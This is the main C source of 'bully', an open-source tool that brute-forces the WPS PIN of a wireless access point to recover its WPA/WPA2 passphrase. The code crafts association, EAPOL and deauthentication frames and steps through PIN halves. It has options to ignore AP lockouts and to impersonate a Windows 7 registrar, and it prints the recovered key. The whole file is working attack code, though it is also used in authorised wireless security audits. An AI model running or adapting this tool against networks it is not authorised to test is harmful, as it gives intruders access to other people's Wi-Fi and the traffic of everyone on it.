/*
    bully - retrieve WPA/WPA2 passphrase from a WPS-enabled AP

    Copyright (C) 2012  Brian Purcell <purcell.briand@gmail.com>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <pcap.h>
#include <linux/if_ether.h>
#include <linux/if.h>
#include <linux/wireless.h>
#include <linux/if_tun.h>
#include <netinet/in.h>
#include <endian.h>
#include <byteswap.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#include <fcntl.h>
#include <ctype.h>
#include <limits.h>
#include <pwd.h>

#define	CONFIG_NO_STDOUT_DEBUG	1
#define	CONFIG_INTERNAL_LIBTOMMATH
#include "tls/bignum.c"

#define	eloop_register_timeout(v,w,x,y,z)	_ert = 0
#define	eloop_cancel_timeout(x,y,z)		_ect = 0
#define	wps_enrollee_process_msg(x,y,z)		_epm = 0
#define	wps_enrollee_get_msg(y,z)		_egm = 0

#include "utils/os_unix.c"
#include "utils/common.c"
#include "utils/base64.c"
#include "utils/uuid.c"
#include "utils/wpa_debug.c"
#include "utils/wpabuf.c"
#include "crypto/sha256.c"
#include "crypto/aes-cbc.c"
#include "crypto/crypto_openssl.c"
#include "wps/wps.c"
#include "wps/wps_registrar.c"
#include "wps/wps_common.c"
#include "wps/wps_dev_attr.c"
#include "wps/wps_attr_parse.c"
#include "wps/wps_attr_process.c"
#include "wps/wps_attr_build.c"

#include "bswap.h"
#include "80211.h"
#include "frame.h"
#include "iface.h"
#include "bully.h"

sig_atomic_t ctrlc = 0;
sig_atomic_t signm = 0;
void sigint_h(int signal) { signm = signal; ctrlc = 1; };

#include "utils.c"
#include "timer.c"
#include "crc32.c"
#include "80211.c"
#include "frame.c"
#include "iface.c"

#include "version.h"

int main(int argc, char *argv[])
{
	int	k, result, nocheck = 0, fcs_count = 0, to_count = 0;

	char	essids[33] = {0}, *essid = essids;
	char	bssids[18] = {0};
	char	hwmacs[18] = {0};

	char	*error;

	mac_t	*mac;
	tag_t	*tag, *tags[20] = {0};
	vtag_t	*vtag, *vt;
	int	tlen, vlen, tn = 1;

	uint8	essidt[35] = {0};

	struct timeval timer;
	struct sigaction sigact = {0};
	struct stat wstat;

	FILE	*rf, *of;

	srandom(time(NULL));

	struct global *G;
	if (G = calloc(1, sizeof(struct global))) {

		G->phdr = calloc(1, sizeof(struct pcap_pkthdr));
		if (!G->phdr)
			goto mem_err;
		G->error = calloc(1,256);
		if (!G->error)
			goto mem_err;
		G->perr = calloc(1,PCAP_ERRBUF_SIZE);
		if (!G->perr)
			goto mem_err;
		G->index = calloc(1,MAX_CHAN+1);
		if (!G->index)
			goto mem_err;

		__vp = malloc(__vs);
		if (!__vp)
			goto mem_err;
		__vf = stdout;

		G->inp = f_init();
		if (!G->inp)
			goto mem_err;

		G->verbose = __vb;
		G->smacs = fmt_mac(hwmacs,G->hwmac);
		G->lwait = LOCK_WAIT_SECS;
		G->hop = BG_CHANS;
		G->has_fcs = 1;
		G->use_ack = 1;
		G->eapmode = 1;
		G->retries = MAX_RETRIES;
		G->random = 1;
		G->acktime = ACKTIME;
		G->stdtime = STDTIME;
		G->m13time = M13TIME;
		G->k1step = 1;
		G->k2delay = 5;
		G->k2step = 1;
		G->pinstart = G->pindex = -1;

		char *temp = getpwuid(getuid())->pw_dir;
		G->warpath = malloc(strlen(temp) + strlen(EXE_NAME) + 3);
		strcpy(G->warpath, temp);
		strcat(G->warpath, "/.");
		strcat(G->warpath, EXE_NAME);
		mkdir(G->warpath, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);

	} else {
	mem_err:
		fprintf(stderr, "Memory allocation error\n");
		return 2;
	};


	while( 1 )
	{
		int option_index = 0;

		static struct option long_options[] = {
			{"acktime",	1,	0,	'a'},
			{"bssid",	1,	0,	'b'},
			{"channel",	1,	0,	'c'},
			{"essid",	1,	0,	'e'},
			{"index",	1,	0,	'i'},
			{"lockwait",	1,	0,	'l'},
			{"m13time",	1,	0,	'm'},
			{"outfile",	1,	0,	'o'},
			{"pin",		1,	0,	'p'},
			{"retries",	1,	0,	'r'},
			{"source",	1,	0,	's'},
			{"timeout",	1,	0,	't'},
			{"verbosity",	1,	0,	'v'},
			{"workdir",	1,	0,	'w'},
			{"pin1delay",	1,	0,	'1'},
			{"pin2delay",	1,	0,	'2'},
			{"5ghz",	0,	0,	'5'},
			{"noacks",	0,	0,	'A'},
			{"nocheck",	0,	0,	'C'},
			{"bruteforce",	0,	0,	'B'},
			{"detectlock",	0,	0,	'D'},
			{"eapfail",	0,	0,	'E'},
			{"force",	0,	0,	'F'},
			{"lockignore",	0,	0,	'L'},
			{"m57nack",	0,	0,	'M'},
			{"nofcs",	0,	0,	'N'},
			{"probe",	0,	0,	'P'},
			{"radiotap",	0,	0,	'R'},
			{"sequential",	0,	0,	'S'},
			{"test",	0,	0,	'T'},
			{"version",	0,	0,	'V'},
			{"windows7",	0,	0,	'W'},
			{"suppress",	0,	0,	'Z'},
			{"help",	0,	0,	'h'},
			{0,		0,	0,	 0 }
		};

		int option = getopt_long( argc, argv, "a:b:c:e:i:l:m:o:p:r:s:t:v:w:1:2:5ABCDEFLMNPRSTVWZh",
					long_options, &option_index );

		if( option < 0 ) break;

		switch( option ) {
			case 0 :
				break;
			case 'a' :
				if (get_int(optarg, &G->acktime) != 0) {
					snprintf(G->error, 256, "Bad packet timeout number -- %s\n", optarg);
					goto usage_err;
				};
				printf("Deprecated option --acktime (-a) ignored\n");
				break;
			case 'b' :
				if (get_mac(optarg, G->bssid) != 0) {
					snprintf(G->error, 256, "Bad target MAC address -- %s\n", optarg);
					goto usage_err;
				};
				G->ssids = fmt_mac(bssids,G->bssid);
				break;
			case 'c' :
				G->hop = optarg;
				break;
			case 'e' :
				G->essid = optarg;
				break;
			case 'i' :
				if (get_int(optarg, &G->pindex) != 0 || 99999999 < G->pindex) {
					snprintf(G->error, 256, "Bad starting index number -- %s\n", optarg);
					goto usage_err;
				};
				break;
			case 'l' :
				if (get_int(optarg, &G->lwait) != 0) {
					snprintf(G->error, 256, "Bad lock wait number -- %s\n", optarg);
					goto usage_err;
				};
				break;
			case 'm' :
				if (get_int(optarg, &G->m13time) != 0) {
					snprintf(G->error, 256, "Bad M1/M3 timeout number -- %s\n", optarg);
					goto usage_err;
				};
				printf("Deprecated option --m13time (-m) ignored\n");
				break;
			case 'o' :
				if ((of = fopen(optarg, "w")) != NULL)
					__vf = of;
				else {
					snprintf(G->error, 256, "Can't open output file -- %s\n", optarg);
					goto usage_err;
				};
				break;
			case 'p' :
				if (get_int(optarg, &G->pinstart) != 0 || 99999999 < G->pinstart) {
					snprintf(G->error, 256, "Bad starting pin number -- %s\n", optarg);
					goto usage_err;
				};
				break;
			case 'r' :
				if (get_int(optarg, &G->retries) != 0) {
					snprintf(G->error, 256, "Bad max retries number -- %s\n", optarg);
					goto usage_err;
				};
				break;
			case 's' :
				if (get_mac(optarg, G->hwmac) != 0 || memcmp(G->hwmac, NULL_MAC, 6) == 0) {
					snprintf(G->error, 256, "Bad source MAC address -- %s\n", optarg);
					goto usage_err;
				};
				break;
			case 't' :
				if (get_int(optarg, &G->stdtime) != 0) {
					snprintf(G->error, 256, "Bad timeout number -- %s\n", optarg);
					goto usage_err;
				};
				printf("Deprecated option --timeout (-t) ignored\n");
				break;
			case 'v' :
				if (get_int(optarg, &G->verbose) != 0 || G->verbose < 1 || 3 < G->verbose) {
					snprintf(G->error, 256, "Bad verbosity level -- %s\n", optarg);
					goto usage_err;
				};
				__vb = G->verbose;
				break;
			case 'w' :
				if (stat(optarg, &wstat) || !S_ISDIR(wstat.st_mode)) {
					snprintf(G->error, 256, "Bad working directory -- %s\n", optarg);
					goto usage_err;
				};
				result = wstat.st_mode | (wstat.st_mode>>4);
				if ((result & S_IRWXG) != S_IRWXG) {
					snprintf(G->error, 256, "Permission denied -- %s\n", optarg);
					goto usage_err;
				};
				free(G->warpath);
				G->warpath = optarg;
				break;
			case '1' :
				if (get_int(optarg, &G->k1delay) != 0)
					if (sscanf(optarg, "%d,%d%s", &G->k1delay, &G->k1step, G->error) != 2) {
						snprintf(G->error, 256, "Bad recurring delay -- %s\n", optarg);
						goto usage_err;
					};
				break;
			case '2' :
				if (get_int(optarg, &G->k2delay) != 0)
					if (sscanf(optarg, "%d,%d%s", &G->k2delay, &G->k2step, G->error) != 2) {
						snprintf(G->error, 256, "Bad recurring delay -- %s\n", optarg);
						goto usage_err;
					};
				break;
			case '5' :
				G->hop = AN_CHANS;
				break;
			case 'A' :
				G->use_ack = 0;
				break;
			case 'B' :
				G->broken = 1;
				break;
			case 'C' :
				nocheck = 1;
				break;
			case 'D' :
				G->detect = 1;
				break;
			case 'E' :
				G->eapfail = 1;
				break;
			case 'F' :
				G->force = 1;
				break;
			case 'L' :
				G->ignore = 1;
				break;
			case 'M' :
				G->m57nack = 1;
				times[PKT_M5].avg = times[PKT_M5].max = times[PKT_M5].def * 2;
				times[PKT_M7].avg = times[PKT_M7].max = times[PKT_M7].def * 2;
				break;
			case 'N' :
				G->has_fcs = 0;
				break;
			case 'P' :
				G->probe = 1;
				break;
			case 'R' :
				G->has_rth = 1;
				break;
			case 'S' :
				G->random = 0;
				break;
			case 'T' :
				G->test = 1;
				break;
			case 'V' :
				printf("%s\n",VERSION);
				exit(0);
			case 'W' :
				G->win7 = 1;
				break;
			case 'Z' :
				G->suppress = 1;
				break;
			case 'h' :
				goto usage_err;
			case '?' :
			default  :
				fprintf(stderr, "\"%s --help\" for help.\n", argv[0]);
				return 1;
		};
	};

	if (argc - optind != 1) {
		if (argc - optind == 0)
			G->error = "No monitor mode interface specified\n";
		else
			G->error = "Too many arguments\n";
	usage_err:
		fprintf(stderr, usage, argv[0], G->error);
		return 1;
	};

	if (-1 < G->pindex) {
		if (9999999 < G->pindex && !G->broken) {
			snprintf(G->error, 256,
				"Index number must be less than 8 digits unless -bruteforce is specified -- %08d\n",
				G->pindex);
			goto usage_err;
		};
		if (-1 < G->pinstart) {
			G->error = "Options --index and --pin are mutually exclusive\n";
			goto usage_err;
		};
		if (G->random == 0) {
			G->error = "Option --index is meaningless when specifying --sequential\n";
			goto usage_err;
		};
	};
	if (9999999 < G->pinstart && !G->broken) {
		snprintf(G->error, 256,
			"Pin number must be less than 8 digits unless -bruteforce is specified -- %08d\n",
			G->pinstart);
		goto usage_err;
	};

	G->ifname = argv[optind];

	if (G->essid == 0 && G->ssids == 0) {
		G->error = "Please specify either --bssid or --essid for the access point\n";
		goto usage_err;
	};

	if (G->essid == 0 && G->probe != 0) {
		G->error = "You must specify --essid for the AP when using --probe\n";
		goto usage_err;
	};

	if (memcmp(G->hwmac, NULL_MAC, 6) == 0)
		if (get_hwmac(G->ifname, G->hwmac)) {
			fprintf(stderr, "Unable to get hardware MAC address for '%s'\n", G->ifname);
			fprintf(stderr, "Please specify --source for the interface\n");
			return 8;
		};
	fmt_mac(hwmacs, G->hwmac);

	vprint("[!] Bully %s - WPS vulnerability assessment utility\n", VERSION);

	if ((error = init_chans(G)) != NULL) {
		snprintf(G->error, 256, "Bad channel number or list -- %s\n", error);
		goto usage_err;
	};
	G->chanx = set_chanx(G, G->chanx);
	G->start = (G->chanx ? G->chanx : G->chans[0]);

	if (-1 < G->pinstart && G->random) {
		vprint("[!] Starting pin specified, defaulting to sequential mode\n");
		G->random = 0;
	};

	if (-1 < G->pindex)
		G->pinstart = G->pindex;

	G->pfd = pcap_open_live(G->ifname, 65536, 1, 5, G->perr);
	pcap_close(G->pfd);
	G->pfd = pcap_open_live(G->ifname, 65536, 1, 5, G->perr);
	if (!G->pfd) {
		fprintf(stderr, "%s\n", G->perr);
		return 3;
	};

	vprint("[!] Using '%s' for the source MAC address\n", G->smacs);

	G->dlt = pcap_datalink(G->pfd);
	if (G->dlt == DLT_IEEE802_11_RADIO)
		G->has_rth = 1;
	vprint("[+] Datalink type set to '%d', radiotap headers %s\n",
				G->dlt, (G->has_rth ? "present" : "not present"));

	if (G->probe) {		// Build directed probe request for nonbeaconing AP's
		mac = (mac_t*)(&prober[RTH_SIZE]);
		memcpy(mac->adr2.addr, G->hwmac, 6);
		tags[0] = (tag_t*)(essidt);
		tags[0]->len = strlen(G->essid);
		memcpy(tags[0]->data, G->essid, tags[0]->len);
		int tmpl;  uint8 *tmp = build_ietags(tags, &tmpl);
		G->dprobe = build_packet(prober,sizeof(prober)-1,tmp,tmpl);
		G->reql = sizeof(prober)-1 + tmpl;
		free(tmp);
	};

	vprint("[+] Scanning for beacon from '%s' on channel '%s'\n",
			(G->ssids ? G->ssids : G->essid), G->schan);

	while (1) {
	ap_beacon:
		if (G->probe) {
			if (!G->test)
				result = send_packet(G, G->dprobe, G->reql, 1);
			result = next_packet(G, MAC_TYPE_MGMT, MAC_ST_PROBE_RESP,
							G->hwmac, G->bssid, PKT_PR, TRUE);
		} else
			result = next_packet(G, MAC_TYPE_MGMT, MAC_ST_BEACON,
							BCAST_MAC, G->bssid, PKT_BEA, TRUE);

		if (result == SUCCESS) {
			tag = (tag_t*)(G->inp[F_PAY].data + BFP_SIZE);
			tlen = G->inp[F_PAY].size - BFP_SIZE;
			if (G->essid)
				if (strlen(G->essid) != tag->len)
					goto ap_beacon;
				else
					if (memcmp(G->essid, tag->data, tag->len) == 0)
						break;
					else
						if (memcmp(tag->data, nulls, tag->len) == 0) {
							memcpy(tag->data, G->essid, tag->len);
							break;
						} else
							goto ap_beacon;
			memcpy(essids,tag->data,tag->len);
			G->essid = essids;
			break;
		};

		if (result == FCSFAIL) {
			if (3 <= ++fcs_count) {
				vprint("[!] Disabling FCS validation (assuming --nofcs)\n");
				G->has_fcs = fcs_count = 0;
			};
			continue;
		};

		if (result == TIMEOUT)
			if (!G->fixed) {
				G->chanx = next_chan(G);
				if (G->chanx == G->start) {
					if (++to_count < 3)
						continue;
				} else
					continue;
			} else
				if (++to_count < 3)
					continue;

		vprint("[X] Unable to get a beacon from the AP, possible causes are\n");
		vprint("[.]    an invalid --bssid or -essid was provided,\n");
		if (G->fixed)
			vprint("[.]    the access point isn't on channel '%s',\n", G->schan);
		if (!G->fixed)
			vprint("[.]    channel hopping isn't working (use --channel),\n");
		vprint("[.]    you aren't close enough to the access point.\n");
		return 4;
	};

	memcpy(G->bssid, ((mac_t*)G->inp[F_MAC].data)->adr3.addr, 6);
	G->ssids = fmt_mac(bssids, G->bssid);
	vprint("[+] Got beacon for '%s' (%s)\n", G->essid, G->ssids);
	G->nocheck = nocheck;

	mac = (mac_t*)(&authrq[RTH_SIZE]);
	memcpy(mac->adr1.addr, G->bssid, 6);
	memcpy(mac->adr2.addr, G->hwmac, 6);
	memcpy(mac->adr3.addr, G->bssid, 6);

	mac = (mac_t*)(&deauth[RTH_SIZE]);
	memcpy(mac->adr1.addr, G->bssid, 6);
	memcpy(mac->adr2.addr, G->hwmac, 6);
	memcpy(mac->adr3.addr, G->bssid, 6);

	mac = (mac_t*)(&eapols[RTH_SIZE]);
	memcpy(mac->adr1.addr, G->bssid, 6);
	memcpy(mac->adr2.addr, G->hwmac, 6);
	memcpy(mac->adr3.addr, G->bssid, 6);

	mac = (mac_t*)(&eapolf[RTH_SIZE]);
	memcpy(mac->adr1.addr, G->bssid, 6);
	memcpy(mac->adr2.addr, G->hwmac, 6);
	memcpy(mac->adr3.addr, G->bssid, 6);

	mac = (mac_t*)(&eap_id[RTH_SIZE]);
	memcpy(mac->adr1.addr, G->bssid, 6);
	memcpy(mac->adr2.addr, G->hwmac, 6);
	memcpy(mac->adr3.addr, G->bssid, 6);

	mac = (mac_t*)(&wfamsg[RTH_SIZE]);
	memcpy(mac->adr1.addr, G->bssid, 6);
	memcpy(mac->adr2.addr, G->hwmac, 6);
	memcpy(mac->adr3.addr, G->bssid, 6);

	mac = (mac_t*)(&ackpkt[RTH_SIZE]);
	memcpy(mac->adr1.addr, G->bssid, 6);

	mac = (mac_t*)(&asshat[RTH_SIZE]);
	memcpy(mac->adr1.addr, G->bssid, 6);
	memcpy(mac->adr2.addr, G->hwmac, 6);
	memcpy(mac->adr3.addr, G->bssid, 6);

	assn_t *ass = (assn_t*)(&asshat[RTH_SIZE+MAC_SIZE_NORM]);
	ass->capability = ((bfp_t*)(G->inp[F_PAY].data))->capability;

	tags[0] = tag;
	if ((tags[tn] = find_tag(tag, tlen, TAG_RATE, 0, NULL, 0)) != NULL)
		tn++;
	if ((tags[tn] = find_tag(tag, tlen, TAG_CHAN, 0, NULL, 0)) != NULL) {
		if (G->chans[G->chanx] != tags[tn]->data[0])
			if (!G->fixed)
				G->chanx = set_chan(G, tags[tn]->data[0]);
			else
				vprint("[!] The access point is on channel '%d', not '%s'\n",
							tags[tn]->data[0], G->schan);
		tn++;
	};
	if ((tags[tn] = find_tag(tag, tlen, TAG_XRAT, 0, NULL, 0)) != NULL)
		tn++;
	tags[tn++] = (tag_t*)MS_WPS_TAG;
	tags[tn] = NULL;

	if ((tag = find_tag(tag, tlen, TAG_VEND, 0, MS_WPS_ID, 4)) == NULL) {
		vprint("[X] The AP doesn't appear to be WPS enabled (no WPS IE)\n");
		return 5;
	};

	vtag = (vtag_t*)&tag->data[4];
	vlen = tag->len - 4;
	vt = find_vtag(vtag, vlen, TAG_WPS_STATE, 1);
	if (!vt || vt->data[0] != TAG_WPS_CONFIG) {
		vprint("[!] Beacon information element indicates WPS is not configured\n");
	};
	vt = find_vtag(vtag, vlen, TAG_WPS_APLOCK, 1);
	if (vt && vt->data[0] == TAG_WPS_LOCKED) {
		vprint("[!] Beacon information element indicates WPS is locked\n");
	};

	int msgl;  uint8 *msg = build_ietags(tags, &msgl);
	G->asshat = build_packet(asshat,sizeof(asshat)-1,msg,msgl);
	G->assl = sizeof(asshat)-1 + msgl;
	free(msg);

	parse_packet(G->inp, &wfamsg[0], sizeof(wfamsg)-1, TRUE, TRUE);
	G->d1xlnx = (uint8*)&((d1x_t*)G->inp[F_D1X].data)->len - &wfamsg[0];
	G->eapidx = (uint8*)&((eap_t*)G->inp[F_EAP].data)->id - &wfamsg[0];
	G->eaplnx = (uint8*)&((eap_t*)G->inp[F_EAP].data)->len - &wfamsg[0];
	G->wfaopx = (uint8*)&((wfa_t*)G->inp[F_WFA].data)->op - &wfamsg[0];

	wpsc_t *wconf = calloc(sizeof(wpsc_t),1);
	if (!wconf)
		goto mem_err;
	wconf->registrar = TRUE;

	wpsr_t *wregc = calloc(sizeof(wpsr_t),1);
	if (!wregc)
		goto mem_err;
	wregc->disable_auto_conf = TRUE;

	wconf->wps = calloc(sizeof(wctx_t),1);
	if (!wconf->wps)
		goto mem_err;

	wconf->wps->registrar = wps_registrar_init(wconf->wps, wregc);
	if (!wconf->wps->registrar) {
		vprint("[X] Failed to initialize the WPS registrar, exiting\n");
		return 6;
	};

	for (k=0; k<16; k++)
		wconf->wps->uuid[k] = random() % 256;
	G->wdata = wps_init(wconf);
	if (!G->wdata) {
		vprint("[X] Failed to initialize the WPS structure, exiting\n");
		return 6;
	};

	if (G->win7) {
		G->wdata->wps->dev.device_name = W7_DEVICE_NAME;
		G->wdata->wps->dev.manufacturer = W7_MANUFACTURER;
		G->wdata->wps->dev.model_name = W7_MODEL_NAME;
		G->wdata->wps->dev.model_number = W7_MODEL_NUMBER;
		G->wdata->wps->dev.rf_bands = W7_RF_BANDS;
		memcpy(G->wdata->wps->dev.pri_dev_type, W7_DEVICE_TYPE, 8);
		memcpy(&G->wdata->wps->dev.os_version, W7_OS_VERSION, 4);
	};

	free(wconf);
	free(wregc);

	G->pinf = malloc(strlen(G->warpath) + 6);
	strcpy(G->pinf, G->warpath);
	strcat(G->pinf, "/pins");

	if (G->random)
		init_pins(G);

	G->runf = malloc(strlen(G->warpath) + 18);
	strcpy(G->runf, G->warpath);
	strcat(G->runf, "/");
	strcat(G->runf, hex(G->bssid, 6));
	strcat(G->runf, ".run");

	char	pinstr[9];
	int	pincount, savecount;
	int	pinmax = (G->broken ? 100000000 : 10000000);
	int	pin2max = (G->broken ? 10000 : 1000);
	int	pin2div = (G->broken ? 1 : 10);
	int	pin, pindex, phold = get_start(G);

	sigact.sa_handler = sigint_h;
	sigaction(SIGHUP,  &sigact, 0);
	sigaction(SIGINT,  &sigact, 0);
	sigaction(SIGPIPE, &sigact, 0);
	sigaction(SIGALRM, &sigact, 0);
	sigaction(SIGTERM, &sigact, 0);
	sigaction(SIGCHLD, &sigact, 0);

restart:
	G->restart = 0;
	pincount = savecount = 0;
	pindex = phold;

	if (-1 < G->pinstart)
		pindex = G->pinstart;

	if (G->random)
		pin = G->pin1[pindex/pin2max] * pin2max + G->pin2[pindex%pin2max] / pin2div;
	else
		pin = pindex;

	if (G->broken) {
		snprintf(pinstr,9,"%08d",pin);
		vprint("[+] Index of starting pin number is '%08d'\n", pindex);
	} else {
		snprintf(pinstr,9,"%07d%1d",pin,wps_pin_checksum(pin));
		vprint("[+] Index of starting pin number is '%07d'\n", pindex);
	};

	struct timeval start, now;
	int time, last, secs, hour, mins, i, d, key1hit;
	key1hit = 0;

	gettimeofday(&start, 0);
	last = start.tv_sec;

	ctrlc = G->test;
	result = DEORDIS;

	while (!ctrlc) {

		while (!ctrlc && result != SUCCESS) {
			vprint("[+] %s = '%s'   Next pin '%s'\n", state[G->state], names[result], pinstr);
			result = reassoc(G);
		};

		if (ctrlc) {
			result = ctrlc;
			break;
		};

		if (wps_registrar_add_pin(G->wdata->wps->registrar, NULL, pinstr, 8, 0)) {
			vprint("[X] Failed to add registrar pin '%s', exiting\n", pinstr);
			return 6;
		};

		result = wpstran(G);

		wps_registrar_expire_pins(G->wdata->wps->registrar);

		if (G->restart)
			goto restart;

		if (result == SUCCESS)
			break;

		if (G->state != RECV_M2D_M3 || result != WPSFAIL)
			G->dcount = 0;

		if (KEY1NAK <= result) {

			if ((++pincount & 0x1f) == 0) {
				gettimeofday(&now, 0);
				secs = time = now.tv_sec - start.tv_sec;
				hour = secs/3600;	secs -= hour*3600;
				mins = secs/60;		secs -= mins*60;
				i = time/pincount;	time -= i*pincount;
				d = time*100/pincount;
				vprint("[!] Run time %02d:%02d:%02d, pins tested %d (%d.%02d seconds per pin)\n",
								hour, mins, secs, pincount, i, d);

				secs = time = now.tv_sec - last;
				i = time/32;	time -= i*32;
				d = time*100/32;
				time = pinmax - pindex;
				time = time/pin2max + (time%pin2max ? time%pin2max : pin2max-1);

				vprint("[!] Current rate %d.%02d seconds per pin, %05d pins remaining\n",
								i, d, time);
				secs = ((time * i * 100) + (time * d)) / 200;
				hour = secs/3600;	secs -= hour*3600;
				mins = secs/60;		secs -= mins*60;
				vprint("[!] Average time to crack is %d hours, %d minutes, %d seconds\n",
								hour, mins, secs);

				last = now.tv_sec;

				if ((++savecount & 0x01) == 0) {
					if ((rf = fopen(G->runf, "a")) != NULL) {
						gettimeofday(&timer, NULL);
						strftime(G->error, 256, "%Y-%m-%d %H:%M:%S", localtime(&timer.tv_sec));
						fprintf(rf, "# session in progress at %s\n%08d:%08d:%01d:%s:\n",
								G->error, (G->broken ? pindex : pindex*10),
								(G->broken ? pin : pin*10), G->broken, G->wdata->cred.key);
						fclose(rf);
						fprintf(stderr, "Saving session to '%s'\n", G->runf);
					} else
						fprintf(stderr, "WARNING : Couldn't save session to '%s'\n", G->runf);
				};
			};

			if (result == KEY1NAK) {
				if (!key1hit) {
					pindex += pin2max;
					if (pinmax <= pindex) {
						vprint("[X] Exhausted first-half possibilities without success\n");
						return 7;
					};
				};
				if (G->k1delay && (G->k1step <= ++G->k1count)) {
					G->delay += G->k1delay * 1000;
					G->k1count = 0;
				};
			} else {
				if (result == KEY2NAK) {
					if (key1hit ==0) {
						key1hit = 1;
						pinmax = (pindex/pin2max+1)*pin2max;
					};
					pindex++;
					if (pinmax <= pindex) {
						vprint("[X] Exhausted second-half possibilities without success\n");
						return 7;
					};
					if (G->k2delay && (G->k2step <= ++G->k2count)) {
						G->delay += G->k2delay * 1000;
						G->k2count = 0;
					};
				};
			};

			if (G->random)
				pin = G->pin1[pindex/pin2max] * pin2max + G->pin2[pindex%pin2max] / pin2div;
			else
				pin = pindex;

			if (G->broken)
				snprintf(pinstr,9,"%08d",pin);
			else
				snprintf(pinstr,9,"%07d%1d",pin,wps_pin_checksum(pin));

		};

	};

	if (!G->test) {
		if (result == SUCCESS)
			send_packet(G, eapolf, sizeof(eapolf)-1, 0);
		send_packet(G, deauth, sizeof(deauth)-1, 0);
		send_packet(G, deauth, sizeof(deauth)-1, 0);
		send_packet(G, deauth, sizeof(deauth)-1, 0);
	};

	pcap_close(G->pfd);

	if (result == SUCCESS)
		vprint("[*] Pin is '%s', key is '%s'\n", pinstr, G->wdata->cred.key);

	if ((rf = fopen(G->runf, "a")) != NULL) {
		gettimeofday(&timer, NULL);
		strftime(G->error, 256, "%Y-%m-%d %H:%M:%S", localtime(&timer.tv_sec));
		fprintf(rf, "# session ended %s with signal %d\n%08d:%08d:%01d:%s:\n",
				G->error, signm, (G->broken ? pindex : pindex*10),
				(G->broken ? pin : pin*10), G->broken, G->wdata->cred.key);
		fclose(rf);
		if (ctrlc && !G->test) fprintf(stderr, "\n");
		fprintf(stderr, "Saved session to '%s'\n", G->runf);
	} else
		fprintf(stderr, "WARNING : Couldn't save session to '%s'\n", G->runf);

	if (result == SUCCESS) {
		fprintf(stderr, "\n\tPIN : '%s'", pinstr);
		fprintf(stderr, "\n\tKEY : '%s'\n\n", G->wdata->cred.key);
	} else
		result = -1;

	return result;

};
